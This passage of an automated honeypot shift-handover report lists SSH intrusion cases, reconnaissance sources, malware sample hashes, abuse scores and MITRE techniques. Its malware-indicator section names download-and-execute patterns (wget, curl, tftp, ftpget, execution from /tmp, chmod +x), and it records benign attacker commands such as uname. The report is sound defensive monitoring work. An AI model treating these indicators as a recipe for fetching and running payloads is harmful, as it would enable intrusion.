| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 12:23:37` | `cowrie.session.connect` |
| `2026-08-16 12:23:38` | `cowrie.client.version` |
| `2026-08-16 12:23:38` | `cowrie.client.kex` |
| `2026-08-16 12:23:40` | `cowrie.login.success` |
| `2026-08-16 12:23:41` | `cowrie.direct-tcpip.request` |
| `2026-08-16 12:23:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.233.85[.]194` to AbuseIPDB if not already reported
- [ ] Block `183.233.85[.]194` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9abc02c972a2

| Field | Detail |
|---|---|
| **Source IP** | `103.174.145[.]35` |
| **First Seen** | 2026-08-16 12:23 |
| **Last Seen** | 2026-08-16 12:23 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 12:23:46` | `cowrie.session.connect` |
| `2026-08-16 12:23:47` | `cowrie.client.version` |
| `2026-08-16 12:23:47` | `cowrie.client.kex` |
| `2026-08-16 12:23:49` | `cowrie.login.success` |
| `2026-08-16 12:23:49` | `cowrie.direct-tcpip.request` |
| `2026-08-16 12:23:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.174.145[.]35` to AbuseIPDB if not already reported
- [ ] Block `103.174.145[.]35` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-97223670e1cf

| Field | Detail |
|---|---|
| **Source IP** | `34.146.248[.]7` |
| **First Seen** | 2026-08-16 12:25 |
| **Last Seen** | 2026-08-16 12:25 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 12:25:22` | `cowrie.session.connect` |
| `2026-08-16 12:25:23` | `cowrie.client.version` |
| `2026-08-16 12:25:23` | `cowrie.client.kex` |
| `2026-08-16 12:25:25` | `cowrie.login.success` |
| `2026-08-16 12:25:26` | `cowrie.direct-tcpip.request` |
| `2026-08-16 12:25:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.146.248[.]7` to AbuseIPDB if not already reported
- [ ] Block `34.146.248[.]7` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8e7bdc9dc07a

| Field | Detail |
|---|---|
| **Source IP** | `217.165.22[.]192` |
| **First Seen** | 2026-08-16 12:26 |
| **Last Seen** | 2026-08-16 12:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 12:26:37` | `cowrie.session.connect` |
| `2026-08-16 12:26:37` | `cowrie.client.version` |
| `2026-08-16 12:26:37` | `cowrie.client.kex` |
| `2026-08-16 12:26:38` | `cowrie.login.success` |
| `2026-08-16 12:26:38` | `cowrie.session.params` |
| `2026-08-16 12:26:38` | `cowrie.command.input` |
| `2026-08-16 12:26:39` | `cowrie.log.closed` |
| `2026-08-16 12:26:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.165.22[.]192` to AbuseIPDB if not already reported
- [ ] Block `217.165.22[.]192` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c524a65e8362

| Field | Detail |
|---|---|
| **Source IP** | `103.174.145[.]35` |
| **First Seen** | 2026-08-16 12:28 |
| **Last Seen** | 2026-08-16 12:28 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 12:28:20` | `cowrie.session.connect` |
| `2026-08-16 12:28:21` | `cowrie.client.version` |
| `2026-08-16 12:28:21` | `cowrie.client.kex` |
| `2026-08-16 12:28:23` | `cowrie.login.success` |
| `2026-08-16 12:28:23` | `cowrie.direct-tcpip.request` |
| `2026-08-16 12:28:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.174.145[.]35` to AbuseIPDB if not already reported
- [ ] Block `103.174.145[.]35` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-241004e298bd

| Field | Detail |
|---|---|
| **Source IP** | `45.142.193[.]164` |
| **First Seen** | 2026-08-16 12:32 |
| **Last Seen** | 2026-08-16 12:33 |
| **Session Duration** | 46s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo xsec` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 12:32:17` | `cowrie.session.connect` |
| `2026-08-16 12:32:22` | `cowrie.client.version` |
| `2026-08-16 12:32:22` | `cowrie.client.kex` |
| `2026-08-16 12:32:44` | `cowrie.login.success` |
| `2026-08-16 12:32:56` | `cowrie.session.params` |
| `2026-08-16 12:32:56` | `cowrie.command.input` |
| `2026-08-16 12:33:03` | `cowrie.log.closed` |
| `2026-08-16 12:33:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.142.193[.]164` to AbuseIPDB if not already reported
- [ ] Block `45.142.193[.]164` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a1ff277a4632

| Field | Detail |
|---|---|
| **Source IP** | `194.195.210[.]47` |
| **First Seen** | 2026-08-16 12:38 |
| **Last Seen** | 2026-08-16 12:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `Accept: */*, Accept-Encoding: gzip, User-Agent: Mozilla/5.0 zgrab/0.x` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 12:38:13` | `cowrie.session.connect` |
| `2026-08-16 12:38:13` | `cowrie.login.success` |
| `2026-08-16 12:38:14` | `cowrie.session.params` |
| `2026-08-16 12:38:14` | `cowrie.command.input` |
| `2026-08-16 12:38:14` | `cowrie.command.failed` |
| `2026-08-16 12:38:14` | `cowrie.command.input` |
| `2026-08-16 12:38:14` | `cowrie.command.failed` |
| `2026-08-16 12:38:14` | `cowrie.command.input` |
| `2026-08-16 12:38:14` | `cowrie.command.failed` |
| `2026-08-16 12:38:14` | `cowrie.command.input` |
| `2026-08-16 12:38:14` | `cowrie.log.closed` |
| `2026-08-16 12:38:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `194.195.210[.]47` to AbuseIPDB if not already reported
- [ ] Block `194.195.210[.]47` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dffec753be43

| Field | Detail |
|---|---|
| **Source IP** | `217.165.22[.]192` |
| **First Seen** | 2026-08-16 12:45 |
| **Last Seen** | 2026-08-16 12:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 12:45:44` | `cowrie.session.connect` |
| `2026-08-16 12:45:44` | `cowrie.client.version` |
| `2026-08-16 12:45:44` | `cowrie.client.kex` |
| `2026-08-16 12:45:45` | `cowrie.login.success` |
| `2026-08-16 12:45:45` | `cowrie.session.params` |
| `2026-08-16 12:45:45` | `cowrie.command.input` |
| `2026-08-16 12:45:46` | `cowrie.log.closed` |
| `2026-08-16 12:45:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.165.22[.]192` to AbuseIPDB if not already reported
- [ ] Block `217.165.22[.]192` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3b0b1dafde3d

| Field | Detail |
|---|---|
| **Source IP** | `93.4.16[.]74` |
| **First Seen** | 2026-08-16 12:54 |
| **Last Seen** | 2026-08-16 12:54 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 12:54:05` | `cowrie.session.connect` |
| `2026-08-16 12:54:05` | `cowrie.client.version` |
| `2026-08-16 12:54:05` | `cowrie.client.kex` |
| `2026-08-16 12:54:06` | `cowrie.login.success` |
| `2026-08-16 12:54:06` | `cowrie.direct-tcpip.request` |
| `2026-08-16 12:54:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `93.4.16[.]74` to AbuseIPDB if not already reported
- [ ] Block `93.4.16[.]74` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c5a7ec06aa52

| Field | Detail |
|---|---|
| **Source IP** | `186.215.107[.]189` |
| **First Seen** | 2026-08-16 12:54 |
| **Last Seen** | 2026-08-16 12:54 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 12:54:13` | `cowrie.session.connect` |
| `2026-08-16 12:54:14` | `cowrie.client.version` |
| `2026-08-16 12:54:14` | `cowrie.client.kex` |
| `2026-08-16 12:54:15` | `cowrie.login.success` |
| `2026-08-16 12:54:16` | `cowrie.direct-tcpip.request` |
| `2026-08-16 12:54:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.215.107[.]189` to AbuseIPDB if not already reported
- [ ] Block `186.215.107[.]189` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `80.251.153[.]178` | **4305** | 2026-08-16 10:55 | 2026-08-16 12:55 | 5150m | 0 | `T1592` | 🟠 MEDIUM |
| `107.150.146[.]69` | **44** | 2026-08-16 11:01 | 2026-08-16 12:53 | 25m | 0 | `T1592` | 🟠 MEDIUM |
| `210.16.100[.]120` | **11** | 2026-08-16 11:23 | 2026-08-16 12:48 | 7m | 0 | `T1592` | 🟠 MEDIUM |
| `139.199.80[.]137` | **4** | 2026-08-16 11:11 | 2026-08-16 12:30 | 0m | 0 | `T1592` | 🟢 LOW |
| `91.233.83[.]203` | **4** | 2026-08-16 11:09 | 2026-08-16 12:22 | 3m | 0 | `T1592` | 🟢 LOW |
| `66.132.186[.]203` | **3** | 2026-08-16 11:48 | 2026-08-16 11:48 | 0m | 0 | `T1592` | 🟢 LOW |
| `172.236.228[.]222` | **2** | 2026-08-16 11:22 | 2026-08-16 11:22 | 0m | 0 | `T1592` | 🟢 LOW |
| `174.81.163[.]240` | **2** | 2026-08-16 11:24 | 2026-08-16 11:31 | 0m | 0 | `T1592` | 🟢 LOW |
| `35.144.64[.]23` | **2** | 2026-08-16 12:30 | 2026-08-16 12:31 | 0m | 0 | `T1592` | 🟢 LOW |
| `185.74.59[.]14` | 1 | 2026-08-16 12:15 | 2026-08-16 12:17 | 120s | 0 | `T1592` | 🟢 LOW |
| `213.65.190[.]48` | 1 | 2026-08-16 12:05 | 2026-08-16 12:07 | 120s | 0 | `T1592` | 🟢 LOW |
| `217.211.208[.]125` | 1 | 2026-08-16 12:20 | 2026-08-16 12:22 | 120s | 0 | `T1592` | 🟢 LOW |
| `27.128.240[.]75` | 1 | 2026-08-16 12:19 | 2026-08-16 12:21 | 120s | 0 | `T1592` | 🟢 LOW |
| `49.124.149[.]55` | 1 | 2026-08-16 12:29 | 2026-08-16 12:29 | 0s | 0 | `T1592` | 🟢 LOW |
| `72.14.178[.]148` | 1 | 2026-08-16 11:38 | 2026-08-16 11:38 | 1s | 0 | `T1592` | 🟢 LOW |
| `78.66.44[.]23` | 1 | 2026-08-16 12:25 | 2026-08-16 12:27 | 120s | 0 | `T1592` | 🟢 LOW |
| `94.154.43[.]89` | 1 | 2026-08-16 11:01 | 2026-08-16 11:01 | 0s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 43/100 | 🟡 MEDIUM | **33/72** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca` | Unknown binary | `0db4656687a425c4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 81/100 | 🔴 HIGH | **28/75** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 42/100 | 🟡 MEDIUM | **31/74** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 69/100 | 🟡 MEDIUM | **23/75** 🔴 |
| `1e70b63472772e3f5092ffe9c3573470e73590e6ab6d93fdcede1d368a5fd72d` | Bash Script | `1e70b63472772e3f...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 54/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `21e99667e2f0e73d12aae89f8cabd338426ab1fe4ce828ec93c07de615ef754c` | ELF Binary (Linux executable) (AArch64 64-bit) | `21e99667e2f0e73d...` | 63/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `27d205dc183ea2fad0e55e10b206404be20908e39a74569ff99182d7326ed9c0` | ELF Binary (Linux executable) (x86-64 64-bit) | `27d205dc183ea2fa...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `287962211de7bcadb39f7576732438b43ee6aab420ec23c29a9d12a8151a547f` | ELF Binary (Linux executable) (x86 32-bit) | `287962211de7bcad...` | 42/100 | 🟡 MEDIUM | **31/75** 🔴 |
| `289fd4a7a10aaf8aa313ab80cc170018fc662d0a7d034a3b92b9d3d3945b0736` | ELF Binary (Linux executable) (x86-64 64-bit) | `289fd4a7a10aaf8a...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `2a39d592018600e4b3db2caed6cdaa8c651d3dacbebf8ac1f0960e493843c435` | ELF Binary (Linux executable) (x86-64 64-bit) | `2a39d592018600e4...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `2bd2ab1d4b75aa2b4eed1af697188b8bce35a882faf4335cb4fafc2847197995` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `2bd2ab1d4b75aa2b...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `2f206563640dd66a743ffd493ce0e3c31a8fc5a24b9f5d2b540fc22d45c13d66` | ELF Binary (Linux executable) (x86 32-bit) | `2f206563640dd66a...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `31d4181843b1ed10a7e7cb3f108f6d6c50a7a4452ee52ddacabe8ca77260615e` | Bash Script | `31d4181843b1ed10...` | 58/100 | 🟡 MEDIUM | **20/75** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `94.154.43[.]89` | TR | Storm Industries LLC | **100** ⚠️ | 1 |
| `68.183.244[.]58` | IN | DigitalOcean, LLC | **100** ⚠️ | 0 |
| `139.199.80[.]137` | CN | Tencent cloud computing (Beijing) Co., Ltd. | **100** ⚠️ | 10 |
| `50.217.255[.]171` | US | Comcast Cable Communications, LLC | **100** ⚠️ | 50 |
| `185.246.255[.]183` | IL | Pelephone Communications Ltd. | **100** ⚠️ | 50 |
| `80.251.153[.]178` | NL | Amarutu Technology Ltd | **100** ⚠️ | 3 |
| `194.195.210[.]47` | US | Linode, LLC | **100** ⚠️ | 50 |
| `220.246.66[.]209` | HK | Hong Kong Telecommunications (HKT) Limited Mass Internet | **100** ⚠️ | 50 |
| `103.174.145[.]35` | IN | VAIDIK NETSOL OPC PVT LTD | **100** ⚠️ | 50 |
| `220.132.170[.]64` | TW | Chunghwa Telecom Data Communication Business Group | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1078](https://attack.mitre.org/techniques/T1078) | 145 |
| [T1592](https://attack.mitre.org/techniques/T1592) | 94 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 38 |
| [T1222.002](https://attack.mitre.org/techniques/T1222/002) | 37 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 37 |

---

## 🔕 False Positive Summary (22 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 16 below threshold 25 | 3 |
| AbuseIPDB score 4 below threshold 25 | 1 |
| AbuseIPDB score 6 below threshold 25 | 2 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 16 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 4552 cases |
| Tool 34  | Credential Extractor        | ✅ 167 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 9 fingerprints |
| Tool 36  | Command Clustering          | ✅ 7 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 53 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 22 filtered (0.5%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 40 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 21 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 145 priority case(s) shown individually · 17 recon entry/entries in table (9 group(s) consolidating 4377 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
